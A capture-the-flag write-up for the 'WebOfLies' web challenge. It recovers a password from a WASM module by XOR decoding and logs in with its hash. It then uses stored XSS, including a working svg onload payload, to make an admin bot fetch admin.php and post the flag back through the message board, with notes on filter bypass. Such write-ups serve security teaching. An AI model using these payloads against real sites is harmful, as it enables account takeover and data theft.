# WebOfLies — Web Exploitation

**CTF:** ADF CSA 2026 Season 3
**Category:** Web Exploitation
**Challenge:** WebOfLies
**Flag:** `FLAG{H0w1sth1spossiblewehads0manylayer5!}`

---

## Scenario

> Bob is having a bad day. He'd like to get back at the sysadmins that have been tormenting him, but he can't even remember how to log in at all.

- **Target:** `10.1.199.183:8080` (Apache 2.4.62 / PHP 8.3.19)
- **Task:** Log in, get to the admin panel, find the flag

---

## Enumeration

### The login page is WASM-powered

```bash
curl -s http://10.1.199.183:8080/ | head -80
```

The page (`index.php`) is a login form backed by a WebAssembly module `auth.wasm`:

- username must be `bob` (checked client-side only)
- the password is validated by `wasmModule.exports.check_password(ptr)`
- on success the client computes `SHA-256(password)` and redirects to
  `login.php?user=bob&hash=<hex>` — the server re-validates the hash

### Reversing auth.wasm

```bash
curl -s -o auth.wasm http://10.1.199.183:8080/auth.wasm
file auth.wasm        # WebAssembly (wasm) binary version 0x1 (MVP)
npm install wabt      # disassemble
node -e "..."         # wasm2wat -> auth.wat
```

`check_password` decompiles to:

- `strlen(input) == 15`
- `input[0] == 0x68` (i.e. `'h'`)
- for `i = 1..14`: `data[1024+i] == input[i] ^ 0xC3`

A tiny WASM binary parser pulls the 15-byte data segment at offset `1024`
(`ab f0 a4 f4 8b a4 f4 84 9a f5 e9 8b 84 e2 f0`) and XOR-decodes it:

```python
pw = 'h' + ''.join(chr(b ^ 0xC3) for b in seg[1:15])
# -> h3g7Hg7GY6*HG!3
```

Verified against the live module with Node (`check_password` → `1`), then logged in:

```bash
HASH=$(echo -n 'h3g7Hg7GY6*HG!3' | sha256sum | cut -d' ' -f1)
# c86ad4b82726b9838e3c1b9465df1334bc0c42ce038604c7926250834c181bfb
curl -s -c cookies.txt -o /dev/null -w "%{http_code}\n" \
  "http://10.1.199.183:8080/login.php?user=bob&hash=$HASH"   # 302 -> member.php
```

## The message system: stored XSS against an admin bot

`member.php` (as bob) says *"Your account has been restricted. Leave a message for
the admin below and we will get back to you in a minute or two."* — a classic
XSS-bot setup.

```javascript
fetch('messages.php')
  .then(r => r.json())
  .then(data => {
    const msgs = data.map(line => {
      const parts = line.split('|');
      return parts[1] ? `<p>${parts[1]}</p>` : '';
    }).join('');
    document.getElementById('messages').innerHTML = msgs;   // <-- unsanitized
  });
```

Messages are stored in a **world-readable** `messages.txt` at the web root
(`curl http://10.1.199.183:8080/messages.txt`), one `timestamp|user: content` per
line, and rendered via `innerHTML` — stored XSS.

### Fingerprinting the server-side filter

The server strips some HTML before storing. Testing which tags survive:

| Payload | Stored result |
|---|---|
| `<img src=x onerror=alert(1)>` | `img` (stripped) |
| `<script src=x></script>` | `script` (stripped) |
| `<svg onload=alert(1)>X</svg>` | intact ✅ |
| `<body onload=...>` / `<details open ontoggle=...>` / `<input onfocus autofocus>` | intact ✅ |

Only `<img>` and `<script>` are filtered — every other vector works.

### The payload (in-band exfil)

The admin bot's browser has an admin session, so `admin.php` is readable from its
context. The cleanest exfil needs **no callback server** (the bot can't reach
player infrastructure): have the payload fetch `admin.php` and POST the result
back into the message system, then read it from `messages.txt`.

```html
<svg onload="fetch('admin.php').then(r=>r.text()).then(t=>{var m=t.match(/FLAG\{[^}]+\}/);var x=m?m[0]:t;fetch('member.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'content=HIT:'+encodeURIComponent(x)})})">
```

Backups posted with `<body onload>` and `<details open ontoggle>` variants.

### The flag

~6 seconds after the payloads were posted, the bot rendered them and its browser
dumped `admin.php` into the message board:

```
1785547734|admin: HITC:<h2>Welcome Admin</h2><p>FLAG{H0w1sth1spossiblewehads0manylayer5!}</p>
1785547734|admin: HIT:FLAG{H0w1sth1spossiblewehads0manylayer5!}
1785547734|admin: HITB:<h2>Welcome Admin</h2><p>FLAG{H0w1sth1spossiblewehads0manylayer5!}</p>
```

## How We Solved It — Reasoning

1. **The page never asks for a password in the clear.** The login is a WASM
   black box, so the first question was *"what does the module check?"* —
   disassembly answered it: a 15-char password starting with `h`, XOR-checked
   against a 15-byte blob embedded in the module's data segment. The XOR key
   (`0xC3`) is right in the instruction stream, so the password falls out in
   one line. That's the first "layer".
2. **The client-side check is a lie.** `check_password` is purely cosmetic —
   the server trusts only `login.php?hash=`, which is why the hash (not the
   password) is the real credential. Recovering the password simply gave us the
   correct SHA-256.
3. **The message board is the second layer.** *"The admin will get back to you"*
   + `innerHTML` rendering = the app is baiting for stored XSS against the admin
   bot. The key evidence chain: `messages.txt` is world-readable (so everything
   the bot posts is public), `messages.php` returns raw lines, and the render
   code has zero sanitization.
4. **Filter fingerprinting beat blind guessing.** Instead of hoping a payload
   works, we posted one payload per tag and read `messages.txt` back — the
   stored result *is* the filter's verdict (`img`/`script` stripped, everything
   else intact). That told us exactly which vectors to use.
5. **No callback infrastructure needed.** The bot sits on an isolated network —
   external exfil (our listener, webhook.site) would fail silently. Posting the
   stolen content *through the same app* turns the public message file into a
   reliable one-way channel. `admin.php` under the admin session returned
   `<h2>Welcome Admin</h2><p>FLAG{...}</p>`, and the regex extraction posted
   just the flag.

## Caveats

- **Don't use `alert()` in probe payloads.** An early `alert(1)` test message
  wedged the admin bot on the original instance (headless renderers can hang on
  unhandled dialogs), permanently blocking the append-only message queue —
  the instance had to be reset. Clean payloads (fetch-based, no dialogs) are
  both stealthier and safer.
- The `<img>`/`<script>` filter is case-insensitive (`<IMG ...>` and
  `<img/src=x/...>` are stripped too); `<svg onload>`, `<body onload>`,
  `<details ontoggle>`, `<input autofocus onfocus>` all survive.
- `messages.php` requires a session cookie; `messages.txt` does not — use the
  plain file for readback.
- WASM binary parsing: section sizes, counts, flags and data sizes are LEB128
  varints, and the `i32.const` offset is terminated by an `0x0b` opcode.
